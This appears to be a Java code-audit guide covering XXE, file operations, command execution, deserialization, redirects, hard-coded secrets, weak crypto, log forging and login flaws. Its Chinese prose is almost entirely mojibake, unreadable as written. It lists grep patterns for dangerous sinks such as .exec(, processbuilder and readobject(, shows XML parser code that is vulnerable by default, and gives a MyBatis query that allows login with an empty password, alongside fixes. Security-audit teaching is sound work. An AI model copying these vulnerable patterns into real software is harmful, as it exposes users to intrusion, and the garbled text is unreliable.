ä¸»è¦çåæ°æ¯å¦å¯æ§ï¼æ¯å¦å­å¨è¿æ»¤ï¼åè®®ãç«¯å£ç­çéå¶æªæ½ãç¸å³çéå¶æªæ½æ¯å¦å®åï¼\n 3. éå¸¸æåµä¸ï¼é¡¹ç®ä¼å°è£ä¸ä¸ªç¨äºåèµ·è¯·æ±çæ¹æ³ï¼é¤ä¸è¿°å³é®å­è¿éè¦æ¾è¯¥æ¹æ³å¨é¨è°ç¨ä½ç½®ã\n\n# ä¿®å¤æ¹å¼\n\n 1. å½ç®æ è¯·æ±ä¸ºååæ¶ï¼è·åååæå¯¹åºçipå°åï¼é²æ­¢åé¨è§£æç»è¿ï¼\n 2. è®¾ç½®åç½å°åé»ååæç½ååï¼\n 3. è®¾ç½®åè®®ç½ååï¼\n 4. æ£æ¥å¯¹åºçipå°åæ¯å¦ä¸ºé»ååå°åï¼\n 5. ç¦æ­¢302è·³è½¬ï¼æèå­å¨302è·³è½¬æ¶éå½è·åè·³è½¬çurlï¼å¤æ­æ¯å¦ä¸ºé»ååå°åï¼\n 6. ç¦æ­¢å¶ä»éå¿è¦çåè®®ã\n\n\n# xxe\n\n> åçï¼æå¡å¨æ¥æ¶æ¥èªæ»å»èæ¶ææé çxmlæ°æ®ï¼å¨è§£æxmlæ°æ®æ¶ï¼æ²¡æä¸¥æ ¼çå®å¨æ§å¶æªæ½ï¼å¯¼è´xmlå¤é¨å®ä½æ³¨å¥ãé æä»»ææä»¶è¯»åãæ§è¡å½ä»¤ãä¿¡æ¯æ³é²ç­åæã\n\njavaå¨è§£æxmlæ¶éå¸¸æåç§æ¹å¼ï¼domãsaxãdom4jãjdomã\n\n//1. documentbuilder åçãå¯åæ¾\nimport javax.xml.parsers.documentbuilderfactory;\ndocumentbuilderfactory dbf = documentbuilderfactory.newinstance();\ndocumentbuilder db = dbf.newdocumentbuilder();\nstringreader sr = new stringreader(xml_con);\ninputsource is = new inputsource(sr);\ndocument document = db.parse(is); \n\n//2. saxreader ç¬¬ä¸æ¹åº\nimport org.dom4j.io.saxreader;\nsaxreader saxreader = new saxreader();\ndocument document = saxreader.read(request.getinputstream());\n\n//3. saxbuilder ç¬¬ä¸æ¹åº\nimport org.jdom2.input.saxbuilder;\nsaxbuilder builder = new saxbuilder();  \ndocument document = builder.build(request.getinputstream());\n\n//4. saxparserfactory åçãä¸å¯åæ¾\nimport javax.xml.parsers.saxparserfactory;\nsaxparserfactory factory  = saxparserfactory.newinstance(); \nsaxparser saxparser = factory.newsaxparser();\nsaxhandler handler = new saxhandler();  \nsaxparser.parse(request.getinputstream(), handler);\n\n// å¶ä»æ¹å¼\nimport org.xml.sax.helpers.xmlreaderfactory;\nxmlreader xmlreader = xmlreaderfactory.createxmlreader();\nxmlreader.parse( new inputsource(new stringreader(xml_con)) );\n\nimport org.apache.commons.digester3.digester;\ndigester digester = new digester();\ndigester.parse(new stringreader(xml_con)); \n\nimport javax.xml.parsers.documentbuilderfactory;\ndocumentbuilderfactory dbf = documentbuilderfactory.newinstance();\ndbf.setxincludeaware(true);   // æ¯æxinclude\ndbf.setnamespaceaware(true);  // æ¯æxinclude\ndocumentbuilder db = dbf.newdocumentbuilder();\nstringreader sr = new stringreader(xml_con);\ninputsource is = new inputsource(sr);\ndocument document = db.parse(is);  // parse xml\n\nsaxparserfactory spf = saxparserfactory.newinstance();\nsaxparser saxparser = spf.newsaxparser();\nxmlreader xmlreader = saxparser.getxmlreader();\nxmlreader.parse( new inputsource(new stringreader(xml_con)) );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nxml\nxmlreader\nsaxparser\nsaxbuilder\ndocumentbuilder\ndocument.parse(\n\n\n1\n2\n3\n4\n5\n6\n\n\nxmlè§£æå¸¸è§çåï¼\n\njavax.xml.parsers.documentbuilderfactory;\njavax.xml.parsers.saxparser\njavax.xml.transform.transformerfactory\njavax.xml.validation.validator\njavax.xml.validation.schemafactory\njavax.xml.transform.sax.saxtransformerfactory\njavax.xml.transform.sax.saxsource\norg.xml.sax.xmlreader\norg.xml.sax.helpers.xmlreaderfactory\norg.dom4j.io.saxreader\norg.jdom.input.saxbuilder\norg.jdom2.input.saxbuilder\njavax.xml.bind.unmarshaller\njavax.xml.xpath.xpathexpression\njavax.xml.stream.xmlstreamreader\norg.apache.commons.digester3.digester\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# å¤æ­ä¾æ®\n\n 1. è§£æå¨è§£æçxmléè¦å¤é¨å¯æ§ï¼\n 2. æªç¦ç¨dtdæèåè®¸å¤é¨å®ä½ï¼\n 3. å¤§å¤æ°é¡¹ç®é½ä¼å°è£ä¸ä¸ªç¨äºè§£æxmlçæ¹æ³ï¼å æ­¤é¤ä¸è¿°å³é®å­ä»¥å¤ï¼è¿éè¦å¯»æ¾å¯¹åºæ¹æ³çè°ç¨ä½ç½®éä¸ªå¤æ­ã\n\n# ä¿®å¤æ¹å¼\n\nxxeä¿®å¤æ¹å¼ç¸å¯¹ç®åï¼ç¦ç¨dtdsæèç¦æ­¢ä½¿ç¨å¤é¨å®ä½å³å¯ã\n\ndbf.setfeature("http://apache.org/xml/features/disallow-doctype-decl", true); //ç¦ç¨dtds (doctypes),å ä¹å¯ä»¥é²å¾¡ææxmlå®ä½æ»å»\n//å¦æä¸è½ç¦ç¨dtds,å¯ä»¥ä½¿ç¨ä¸ä¸¤é¡¹ï¼å¿é¡»ä¸¤é¡¹åæ¶å­å¨\ndbf.setfeature("http://xml.org/sax/features/external-general-entities", false);      //é²æ­¢å¤é¨æ®éå®ä½poc æ»å»\ndbf.setfeature("http://xml.org/sax/features/external-parameter-entities", false);   //é²æ­¢å¤é¨åæ°å®ä½pocæ»å»\n\n\n1\n2\n3\n4\n\n\n\n# ä»»ææä»¶æä½\n\n> åçï¼ä»»ææä»¶æä½åå«ä»»ææä»¶ä¸è½½ãå é¤ãä¸ä¼ ãç®å½ï¼æä»¶ï¼éåãè§£åç¼©ç­ãæ»å»èå¯ä»¥å©ç¨ä¸è¿°æ¼æ´æ¶ææä½æå¡å¨æä»¶ã\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nnew file(\nstring path\nstring filename\nnew fileinputstream(\nnew fileoutputstream(\nnew filereader\nresponse.setcontenttype("application/octet-stream; charset=utf-8");\nfile.delete();\nfileutils.\nnew zipentity(\nfile.getname(\n.unzip(\n.mkdirs(\nstream.write(\nsave2file(\nfosãfis.close()\npublic class ziputil\nmultipartfile(\nfile.getoriginalfilename(\nupload\ndownload\nä¸ä¼  // ææ³¨é\nä¸è½½ // ææ³¨é\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# å¤æ­ä¾æ®\n\n 1. æªå¯¹æä»¶è·¯å¾ãæä»¶åç§°ãæä»¶ç±»åååçéå¶ï¼ä¸ä¼ æä»¶è·¯å¾æèæä»¶åç§°å¯å­å¨../ç®å½è·¨è¶çæä½ï¼\n 2. å¨è§£åç¼©æä»¶æ¶æªå¯¹åç¼©åä¸­çæä»¶ç±»åè¿è¡éå¶ï¼\n 3. æªéå¶ä¸ä¼ æä»¶å¤§å°ï¼\n 4. éå¸¸æåµä¸å¨è§£åç¼©æä»¶æ¶ï¼å¼åä¸è¬é½ä¼åå»ºä¸ä¸ªä¸´æ¶ç®å½ï¼è§£åå®æä¹åå°ä¸´æ¶æä»¶å¤¹å é¤ï¼å¦æä¸´æ¶æä»¶å¤¹åç§°å¯ä»¥æ§å¶ï¼åå¯ä»¥è¾¾å°ä»»ææä»¶å é¤çç®çï¼\n 5. å¤æ­æä»¶ç±»åçæä½æ¶ï¼å¼åä¸è¬åè·åå°æä»¶åç§°ï¼ç¶åä½¿ç¨filename.substring(filename.lastindexof("."));è·åæä»¶åç¼åï¼å¦ææ­¤å¤ä½¿ç¨filename.indexof(".")åå¯è½å­å¨ç»è¿å¯è½ã\n\n# ä¿®å¤å»ºè®®\n\n 1. å¤æ­ä¸ä¼ æ°æ®åçcontent-type\n 2. è®¾ç½®ä¸ä¼ æä»¶ç±»åç½ååï¼ä¸ä¼ æä»¶åéå½åï¼éå½åç±»åä¸ä»ä¸ä¼ æä»¶ä¸­è·åï¼\n 3. éå¶æä»¶ä¸ä¼ çå¤§å°ï¼\n 4. å½ä¼ éåæ°ä¸ºæä»¶è·¯å¾æ¶ï¼éè¦å¤æ­è·¯å¾ä¸­æ¯å¦å­å¨../è·¨ç®å½æä½ï¼\n 5. å½åæ°åæ¶å­å¨pathåfilenameæ¶ï¼åå«å¯¹pathãfilenameåæ¼æ¥ç»æè¿è¡å¤æ­åéå¶ï¼\n 6. éå¶ä¸è½½ãå é¤å¯æä½çæ ¹æä»¶å¤¹ã\n\n\n# å½ä»¤æ§è¡\n\n> åçï¼æå¡å¨æ§è¡æ»å»èä¼ å¥çæ¶æå½ä»¤å¹¶æ§è¡ï¼å¯¼è´æ»å»èå¯è·åæå¡å¨æéãææä¿¡æ¯ç­ã\n\n# ä»£ç æç´¢èå´\n\n*,*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nstring cmd\nstring command\nprocessbuilder\nruntime\n.exec(\nnew scriptenginemanager() // å è½½jsæä»¶\nnew yaml();  // snakeyamlå¡åºååæ¼æ´æ§è¡å½ä»¤\nnew groovyshell(); \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# å¤æ­ä¾æ®\n\næ§è¡å½ä»¤åæ°å¯æ§ï¼ä¸ºè¿è¡ç½ååæèè¿æ»¤æä½æä¸ä¸¥æ ¼ï¼æªè¿è¡è½¬ä¹ç¹æ®å­ç¬¦æä½æä¸ä¸¥æ ¼ã\n\n# ä¿®å¤å»ºè®®\n\n 1. éå¿è¦ä¸è°ç¨ç³»ç»å½ä»¤ï¼\n 2. è°ç¨ç³»ç»å½ä»¤æ¶ä¸ä½¿ç¨åå°ä¼ å¥çå½ä»¤ï¼ä½¿ç¨idçæ¹å¼éæ©å¯æ§è¡çå½ä»¤ï¼\n 3. è®¾ç½®å¯æ§è¡å½ä»¤ç½ååï¼ä¸åè®¸ä½¿ç¨ && || & | ;ç­å½ä»¤å¹¶åçç¹æ®å­ç¬¦ï¼\n 4. æ§å¶æ§è¡å½ä»¤ç¨æ·æéï¼\n 5. å½ä»¤æ§è¡æ¼æ´å¨å®éå·¥ä½ä¸­åç°çè¾å°ã\n\n\n# ä¸å®å¨çååºåå\n\n> åçï¼æå¡å¨å¯¹ç¨æ·å¯æ§çæ°æ®è¿è¡ååºååæ¶ï¼æ»å»èå¯æé æ¶æçååºååå¯¹è±¡ï¼å°æå®³æ°æ®ä¼ éå°åºç¨ä»£ç ä¸­ã\n> \n> javaååºååæ¼æ´å¨javaå®å¨ä¸­å æ®éè¦çå°ä½ï¼ä¸äºéç¨ç»ä»¶çæ¼æ´å¾å¾æ¯ç±ååºååæ¼æ´å¼èµ·çãä½å¨å®éå·¥ä½ä¸­ï¼å¼åäººåè¿è¡ååºååæä½å¯è½æ§è¾å°ã\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nreadobject(\n\n\n1\n\n\n# å¤æ­ä¾æ®\n\n 1. ååºååæ°æ®å¯æ§ï¼æ§è¡ååºååæä½ï¼ååºååå¯¹è±¡readobjectæ¹æ³ä¸­å­å¨å±é©æä½ã\n 2. éå¸¸æåµä¸æ¯ä¸æ¹ç»ä»¶ä¸­å­å¨æ¼æ´ï¼å¯¼è´ååºååãå æ­¤åªéè¦å¤æ­é¡¹ç®ä¸­æ¯å¦å¼ç¨äºåå«æ¼æ´çä¸æ¹ç»ä»¶çæ¬å³å¯ï¼å¦æå¼å¥äºåå»ºè®®åçº§ï¼å¦ææ æ³åçº§ï¼åçæ¯å¦æ»¡è¶³å©ç¨æ¡ä»¶ï¼å¹¶å©ç¨wafæ¦æªç¸å³çè¯·æ±ã\n\n# ä¿®å¤å»ºè®®\n\n 1. è®¾ç½®å¯ååºååçç±»ç½ååï¼ä¸åè®¸ååå¤çç±»è¿è¡ååºååï¼\n 2. ä½¿ç¨å®å¨çä¸æ¹ç»ä»¶ã\n\n\n# urlè·³è½¬\n\n> åçï¼å®¢æ·ç«¯ç¨æ·å¯æ§è·³è½¬urlå°åï¼æ»å»èå¨æå¡ç«¯åèµ·è·³è½¬æ¶æå®æ¶æå°åï¼å¯è·³è½¬å°éé±¼æå¶ä»è¿æ³è¿è§é¡µé¢ã\n\n# æç´¢èå´\n\n* ï¼ *.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nstring url\nstring returnurl\nstring returnpath\nstring path\nsendredirect\nforword\nredirect:\n.setheader("refresh"\n.setstatus(302)\n.setheader("location"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# å¤æ­ä¾æ®\n\n 1. è·³è½¬çurlå°åç¨æ·å¯æ§ï¼æªç»è¿è¿æ»¤å¤æ­æè¿æ»¤å¤æ­ä¸ä¸¥æ ¼ï¼\n 2. urlè·³è½¬æ¼æ´å¯éåssrfæ¼æ´ï¼å½ssrfä¸å®å¨æ ¡éªå°åæ¶ï¼å¯ä»¥å©ç¨urlè·³è½¬æ¼æ´è¯·æ±è·³è½¬ä¹åçå°åã\n\n# ä¿®å¤å»ºè®®\n\n 1. è®¾ç½®è·³è½¬å°åç½åå\n 2. å¦æè·³è½¬å°åæ¯åºå®çï¼åå¯ä»¥ä½¿ç¨idç´¢å¼å°åï¼é²æ­¢ç¨æ·ç´æ¥ä¼ å¥ï¼\n 3. åçæè·³è½¬é¾æ¥åå¶ç­¾åï¼è·³è½¬åè¿è¡ç­¾åéªè¯ã\n\n\n# ç¡¬ç¼ç \n\n> åçï¼å½ç¨æ·å¯ä»¥è·åå°ç¨åºæºä»£ç æèç»è¿å¶ä»æ¼æ´è·åå°ç¨åºæºä»£ç æ¶ï¼ç¡¬ç¼ç çå¯ç ç­ææä¿¡æ¯å¯ç´æ¥è¢«ç¨æ·è·åã\n\n# æç´¢èå´\n\n* è¿ååç«¯ä»£ç ä¸èµ·æç´¢ï¼å¯è½æç´¢å°åç«¯è®¤è¯ç¨æ·å¯ç ãäºæå¡idåkeyç­ä¿¡æ¯ã\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\npass\npwd\nkey\naccesskeyid\naccesskey\naccessid\n\n\n1\n2\n3\n4\n5\n6\n\n\n# å¤æ­ä¾æ®\n\nä»£ç ä¸­æææçå¯ç ãå¯é¥ç­ä¿¡æ¯ï¼éå¸¸ä¸åå«ååæµè¯javaæä»¶ï¼\n\n# ä¿®å¤å»ºè®®\n\n 1. å å¯å­å¨å°éç½®æä»¶ä¸­ï¼ç¶åä»£ç ä¸­è¯»åéç½®æä»¶è·åå¯ç ãå¯é¥ï¼\n 2. ä½¿ç¨éç½®ä¸­å¿æèå­å¨å°æ°æ®åºä¸­ã\n\n\n# ä¸å®å¨çå å¯æ¹å¼\n\n> åçï¼ä¸å®å¨çå å¯æ¹å¼åå«ä½¿ç¨ä¸å®å¨çå å¯ç®æ³å¯¼è´æ»å»èå¯¹å å¯æ°æ®å¯éï¼æèä½¿ç¨ä¸ç¬¦åè¦æ±é¿åº¦çå¯é¥è¿è¡å å¯æä½ã\n\n# æç´¢èå´\n\n*.javaã*.propertiesã*.yaml\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\ndes\ndesutil\nsha1\necb\nrsa // çå¯é¥é¿åº¦\nmd5 // å­å¨æ°æ®éè¦å ç\n\n\n1\n2\n3\n4\n5\n6\n\n\n# å¤æ­ä¾æ®\n\n 1. ä½¿ç¨ä¸å®å¨çå å¯æ¹å¼å å¯æ°æ®ï¼\n 2. å®å¨çå å¯æ¹å¼å¯é¥é¿åº¦ä¸ç¬¦åè¦æ±\n 3. å¼åäººåç»å¸¸å¨åç«¯ä½¿ç¨aeså å¯æ°æ®åéå°åç«¯ï¼å ä¸ºaesæ¯å¯¹ç§°å å¯çï¼åç«¯å¿å®å­å¨aeså¯é¥ï¼jsæèè¯·æ±è·åï¼å¯¼è´æ°æ®å å¯ä¼ è¾å½¢åèè®¾ï¼\n 4. æäºå¼åäººåä¸ºäºæµè¯æ¹ä¾¿ï¼ä¼é¢çå è§£å¯æ¥å£ï¼éå¸¸åç§°ä¸ºdecryptåencryptæèjiamiåjiemiï¼\n 5. base64ä¸æ¯å å¯æ¹å¼ï¼æ¾ç»è§è¿è¯·æ±å¤´ä¸­çè®¤è¯ä¿¡æ¯æ¯base64ç¼ç çç¨æ·ååå¯ç ä¸²ã\n\n# ä¿®å¤å»ºè®®\n\n 1. ä½¿ç¨å®å¨çéå¯¹ç§°å å¯ç®æ³\n 2. å å¯ç®æ³å¯é¥é¿åº¦åºè¯¥ç¬¦åå®å¨è¦æ±\n 3. ä½¿ç¨md5å å¯å­å¨å¯ç ä¿¡æ¯æ¶åºå½å çï¼å»ºè®®ä½¿ç¨è¡¨ä¸­uuidãcreatedateç­å·æè¿·ææ§è´¨çéæºçï¼\n\n\n# æ¥å¿ä¼ªé \n\n> åçï¼å°æªç»éªè¯çç¨æ·è¾å¥åå¥æ¥å¿æä»¶å¯è´ä½¿æ»å»èä¼ªé æ¥å¿æ¡ç®æå°æ¶æä¿¡æ¯åå®¹æ³¨å¥æ¥å¿ã\n\n# æç´¢èå´\n\n*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\n.info(\n.error(\n.debug(\n.warn(\n\n\n1\n2\n3\n4\n\n\n# å¤æ­ä¾æ®\n\n 1. æ¥å¿æå°åå®¹å¯æ§ï¼\n 2. æ¥å¿åå®¹æªè¿æ»¤\n\n# ä¿®å¤å»ºè®®\n\n 1. æ¥å¿åå®¹åºå®ï¼\n 2. è¿æ»¤æå°åå®¹ï¼è®¾ç½®å¯æå°å­ç¬¦ç½ååï¼ä¸åè®¸æå°æ¢è¡\\n\n\n\n# ææä¿¡æ¯æ³é²\n\n> åçï¼ææä¿¡æ¯æ³é²åå«ç³»ç»ææä¿¡æ¯æ³é²åç¨æ·ææä¿¡æ¯æ³é²ã\n\nç³»ç»çææä¿¡æ¯æ³é²éå¸¸ç±ç³»ç»æ§è¡ä»£ç å¼å¸¸å¯¼è´çï¼ç±äºæªè®¾ç½®ç»ä¸çæ¥éé¡µé¢ï¼å¯è½ç´æ¥å°æ¥éä¿¡æ¯è¿åç»æµè§å¨ï¼å¶ä¸­å¯è½åå«æäºéç½®ãè°ç¨æ ãsqlè¯­å¥ãè·¯å¾ç­ã\n\nç¨æ·ææä¿¡æ¯æ³é²éå¸¸æ¯ç±æå¡å¨è¿åè¾å¤çç¨æ·ä¿¡æ¯ï¼å¯ç ï¼æèè¿åæªè±æçæ°æ®å¯¼è´çã\n\n# æç´¢èå´\n\n*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\npassword\npass\naddress\nidno\nphoneno\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n\n\n# å¤æ­ä¾æ®\n\n 1. æ¯å¦å­å¨ç»ä¸æ¥éè¿åï¼\n 2. è¿åç»ææ¯å¦åå«ææåå®¹ã\n 3. å¯¹äºå¤§åé¡¹ç®æ¥è¯´ï¼è¿åçç»æå¾å¾è¢«å°è£æå®ä½åè¿åï¼å æ­¤å¯ä»¥æ¥æ¾è¿åçç»æå°è£ä¸­æ¯å¦åå«ä»¥ä¸çå­æ®µï¼å¦æåå«åè¿½è¸ªå°å¯¹åºçä½ç½®ï¼æ¥çæ¯å¦è¿è¡è±ææèæ¸ç©ºã\n\n# ä¿®å¤å»ºè®®\n\n 1. å®å¶ç»ä¸æ¥éé¡µé¢æèç»ä¸æ¥éjsonè¿åï¼\n 2. åªè¿åå¿è¦çä¿¡æ¯ï¼å¯ç ç­å­æ®µä¸åºè¿åï¼ææå­æ®µè±æè¿åã\n\n\n# å®å¨éç½®éè¯¯\n\n> åçï¼ç±äºå¼åå¨éç½®ç»ä»¶æ¶çæ æè¯æèæ¹ä¾¿ä½¿ç¨ï¼å¯¼è´æ»å»èå¯ä»¥æªææè®¿é®ç¬¬ä¸æ¹ç»ä»¶ï¼å¯¼è´ä¿¡æ¯æ³é²ã\n\n# åç°æ¹å¼\n\nçpomæä»¶æèlibä¸­æ¯å¦å­å¨å¯è½æéç½®éè¯¯çç»ä»¶ï¼ç¶åæ¥çå¯¹åºçéç½®ã\n\nå¸¸è§çæå¯è½å­å¨é®é¢çç»ä»¶å¦ä¸ï¼swagger ãshiroãspringsecurityãdruidãspring boot actuator\n\nç¸å¯¹äºç½çèè¨ï¼è¿ç§éç½®éè¯¯å¯¼è´çæªææé®é¢é»çå®¡è®¡æ´ä¸ºæ¹ä¾¿ãæ¹éè®¿é®å¯¹åºurlå¤æ­æ¯å¦è½å¤è®¿é®æåå³å¯ã\n\n# ä¿®å¤å»ºè®®\n\n 1. swaggerä¸å»ºè®®å¯¹å¬ç½å¼æ¾ï¼\n 2. å¦æç¡®å®å­å¨å¼æ¾çå¿è¦ï¼åå¿é¡»è¿è¡èº«ä»½è®¤è¯åæææä½ï¼\n 3. å¯ä»¥éç½®å¯ç å¯é¥çç»ä»¶éè¦éç½®å¯ç åå¯é¥ï¼å¹¶ä¿è¯å¯é¥çå¤æåº¦ã\n\n\n# xss\n\n> åçï¼æ»å»èå©ç¨æ¶ææé çjsä»£ç ä½¿æµè§å¨å¨è§£ææ¶äº§çæ­§ä¹ï¼è¾¾å°æ»å»èæ»å»ç¨æ·æµè§å¨çç®çã\n\n# åç°æ¹å¼\n\nxssæ¼æ´è¦çèå´è¾å¹¿ï¼æå¡ç«¯åå¤åéæ°æ®çåºæ¯é½æå¯è½äº§çxssãxssè¿ååç«¯ä½¿ç¨çæ¡æ¶ç¸å³ï¼æäºæ¡æ¶å¯¹äºxssæå¾å¥½çé²æ¤æ§ãå æ­¤ç½çåç°xssè¾ä¸ºå¤æï¼å¯ä»¥çä¸å¡é»è¾çä½ç½®è¾å©ççï¼åç°å­å¨å¯è½æ§çä½ç½®åï¼éåé»çå¨å·ä½çç«ç¹ä¸å°è¯æ¯å¦å¯ä»¥æåãä¹å¯ä»¥ççæ¯å¦å­å¨è¿æ»¤å¨ï¼å¯¹xssè¿è¡å®ä½åè½¬ä¹æèè¿æ»¤ï¼è½¬ä¹æèè¿æ»¤æ¯å¦ä¸¥è°¨åè§èã\n\n# ä¿®å¤å»ºè®®\n\n 1. htmlå®ä½å\n 2. cookieè®¾ç½®httponly\n 3. è¿æ»¤ç¹æ®å­ç¬¦ãè¿æ»¤äºä»¶æ ç­¾\n\n\n# ä¸å¡é»è¾æ¼æ´å®¡è®¡æ¹å¼\n\n> ä¸å¡é»è¾æ¼æ´æ¯è¾å¤æï¼åå«ä¸å¡çåä¸ªæ¹é¢ï¼å¹¶ä¸åºæ¬æ²¡æå¯ç¨çæç´¢å­ç¬¦ä¸²åå®ä½æ¹å¼ï¼å¾å¾éè¦éè¯»åè½ç¹ä»£ç ï¼çè§£æç§åè½çæä½æµç¨ï¼åç°å¶ä¸­çå®å¨é£é©ã\n\n\n# è®¤è¯ç¸å³\n\n# æ³¨åé»è¾\n\nä»»æç¨æ·æ³¨å\n\nä»»æç¨æ·æ³¨åå¾å¾ç±äºæªè¦æ±ç¨æ·æä¾ææºå·ãé®ç®±ç­å¯ç¡®å®å½å±çèº«ä»½ä¿¡æ¯ãæªå¯¹ç¨æ·æä¾çèº«ä»½ä¿¡æ¯è¿è¡éªè¯æèèº«ä»½ä¿¡æ¯éªè¯çæµç¨å¯ç»è¿ãä»ä»£ç ä¸çè¡¨ç°å°±æ¯å­å¨ææºå·åé®ç®±çéªè¯ãææºå·é®ç®±çéªè¯åæå¥ç¨æ·è¡¨çæä½éè¦ä¸æ¬¡å®ææèå­å¨ååçæ ¡éªï¼é²æ­¢è¶è¿è¯·æ±ç´æ¥åèµ·æå¥ç¨æ·æ°æ®æä½ã\n\næ³¨åè¦çåç¨æ·\n\næ³¨åè¦çåç¨æ·éå¸¸åçå¨æ³¨ååä¿®æ¹ç¨æ·ä¿¡æ¯æ¥å£å¤ç¨çæåµä¸ï¼æèç¨æ·å¨æ³¨åæ¶æªéªè¯æ°æ³¨åçç¨æ·å¨å½åç³»ç»ä¸­æ¯å¦å­å¨ï¼å¦æéå¤æ³¨åç¨æ·ï¼å¯è½å­å¨åç¨æ·ä¿¡æ¯æ³é²ãæéæ¥ç®¡ç­é£é©ãä»£ç ä¸­ä¸»è¦çæ¯å¦æ ¡éªç¨æ·åçå¯ç¨æ§ã\n\nå¯ç ææå­å¨\n\nå¨å®å¨å¼åè§èä¸­è¦æ±å¯ç éè¦å å¯å­å¨ï¼éå¸¸å¼åäººåä½¿ç¨md5å çå­å¨å¯ç ä¿¡æ¯ãä»£ç ä¸­å¦ææªåç°å å¯å­å¨è¡ä¸ºåå¯è½æææå¯ç å­å¨çé£é©ãå¦å¤æå¯è½åå°ä¼ è¿æ¥çå¯ç æ¬èº«å°±æ¯å å¯çï¼ä½æ¯å¹¶ä¸æå¡è¿ç§æ¹å¼ï¼å ä¸ºåå°æµè§å¨ç«¯çå å¯æ¯ç¨æ·å®éå¯æ§çã\n\nå¯ç çå¼ç¡¬ç¼ç \n\nå¨å¯ç å­å¨æ¶ï¼å»ºè®®ä½¿ç¨éæºçå¼è¿è¡å å¯ãä½¿ç¨ç»ä¸ççå å¯æ¶ï¼ä¼éä½å­å¨å¯ç çå®å¨æ§ãå¯ç¨çæ¹æ¡æ¯æ°æ®è¡¨ä¸­æ·»å ä¸åçå¼å­æ®µï¼æèä½¿ç¨ç°æçä¸å¯åçæ°æ®åºå­æ®µä¿¡æ¯ï¼æ¯å¦ï¼uuidãcreatetimeï¼è¿è¡å çï¼ä½¿ç¨å¯ä¿®æ¹åå®¹å çå°å¯¼è´è®¤è¯å¤±è´¥ã\n\nå¯ç å¤æåº¦ä½\n\nåç«¯éªè¯å¯ç å¤æåº¦ï¼åç«¯ä¸éªè¯æ¶å¯ç»è¿å¯ç å¤æåº¦è¦æ±ãéè¦åç«¯è¿è¡å¯ç å¤æåº¦çæ ¡éªã\n\n# ç»å½é»è¾\n\nä»»æç¨æ·ç»å½\n\nä»»æç¨æ·ç»å½æçæ¯æå¡ç«¯ä¸éªè¯ç¨æ·å¯ç ãä»£ç ä¸çè¡¨ç°ä¸ºåå°æªä¼ å¥ç¨æ·å¯ç ä¿¡æ¯ï¼æèä¼ å¥å¯ç ä¿¡æ¯ä¹åï¼æªä½¿ç¨ç¨æ·åãå¯ç ç»å®æ¥è¯¢ç¨æ·ä¿¡æ¯ãè¿ç§æ¹å¼å°å¯¼è´ä»»æç¨æ·ç»å½ã\n\nç©ºå£ä»¤ç»å½\n\nç©ºå£ä»¤ç»å½æçæ¯ç¨æ·å¨éè¦è¾å¥ç¨æ·åå¯ç æ¶ï¼ä¼ éäºç©ºå­ç¬¦ä¸²æèæªä¼ éè¯¥åæ°ãå¨ä»¥mybaitsä¸ºä¾ï¼å¨æ¥è¯¢æ°æ®åºæ¶å¦æå¼åéç¨å¦ä¸çåæ³ï¼å°å¯¼è´å¯ç ä¸ºç©ºæèç©ºå­ç¬¦ä¸²æ¶ï¼ä¸å¸¦å¥æ¥è¯¢ã\n\n<if test="password != null and password != \'\'">\n  and password = #{password}\n</if>\n\n\n1\n2\n3\n\n\nç»å½çç ´\n\nå¨è¿è¡ç¨æ·ç»å½æ¶æªè¿è¡åä¸ç¨æ·ãåä¸ipãåä¸ä¼è¯çç¨æ·ç»å½æ¬¡æ°éå¶æèæªä½¿ç¨éªè¯ç ï¼å¯å¯¼è´ç»å½çç ´ãè§£å³æ¹æ¡å¯éï¼\n\n * ä½¿ç¨å®å¨çäººæºäº¤äºéªè¯æ¹å¼\n * å¯¹åä¸ç¨æ·çå¤æ¬¡ç»å½å°è¯åé»æ­ï¼å°éè´¦å·ãéªè¯ç»å®ææºå·ï¼\n * å¯¹åä¸ipå¤æ¬¡ç»å½å¤±è´¥çå°è¯è¿è¡å°ç¦\n * éå¯¹åä¸åè¯å¤æ¬¡è´¦æ·ç»å½å°è¯åé»æ­\n * è®¾ç½®é£é©ç¨æ·ååï¼é£é©ç¨æ·ç»å½æ¶éè¦å¤å å­éªè¯\n\nç¨æ·åæä¸¾\n\nç¨æ·åæä¸¾ä¸»è¦åçå¨ç»å½æ¶ç»æè¿åãæ³¨ååçç¨æ·åå¯ç¨æ§æ¥è¯¢ãæ¾åå¯ç åçç¨æ·å¤æ­ã**æªææç¨æ·ä¿¡æ¯æ¥è¯¢ï¼è¾å°ï¼**çæ¥å£è¿åãè§£å³æ¹æ¡æ¯ç»å½å¤±è´¥æèæåãæ¾åå¯ç ç¨æ·å¤æ­è¿åç»ä¸çä¿¡æ¯ãå¦ç»å½å¤±è´¥å¯ç»ä¸è¿åâç¨æ·åæå¯ç éè¯¯ãâï¼æ³¨ååæèæ¾åå¯ç çç¨æ·åå¤æ­æ·»å éªè¯ç ãéå¯¹æªææç¨æ·ä¿¡æ¯æ¥è¯¢ä¸è¬æåµä¸ä¸åè®¸å­å¨è¿ç§æ¥å£ï¼è¦æ±é´ææä¸çº¿ã\n\nç»å½éªè¯ä¸å®å¨\n\nå¼±å£ä»¤ç»å½ä¸è¬æå ç§æåµï¼\n\n * 